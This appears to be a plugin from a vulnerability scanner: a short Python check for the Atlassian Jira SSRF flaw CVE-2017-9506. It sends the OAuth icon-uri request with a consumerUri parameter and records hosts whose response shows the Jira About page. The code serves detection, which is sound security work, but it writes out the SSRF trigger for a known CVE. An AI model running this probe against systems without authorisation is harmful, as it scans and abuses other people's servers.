import requests

from celery_app.utils.utils import insert_vuln_db
from celery_app.config.config import web_port_short

#Atlassian Jira SSRF 漏洞（CVE-2017-9506）
plugin_id=74
default_port_list=web_port_short


def check(host, port=80):
    scheme = 'https' if '443' in str(port) else 'http'
    target = '{}://{}:{}'.format(scheme, host, port)
    uris = ['/plugins/servlet/oauth/users/icon-uri?consumerUri={}/secure/AboutPage.jspa'.format(target)]
    hits = ['Atlassian Corporation Pty Ltd']
    try:
        targets = ['{}{}'.format(target, uri) for uri in uris]
        requests.packages.urllib3.disable_warnings()
        with requests.Session() as session:
            for target in targets:
                response = session.get(target, timeout=10, verify=False)
                for hit in hits:
                    if hit in response.text:
                        output = response.text
                        insert_vuln_db(host, target, output, plugin_id)
                        return True, host, target, output
    except Exception as error:
        return False
    return False

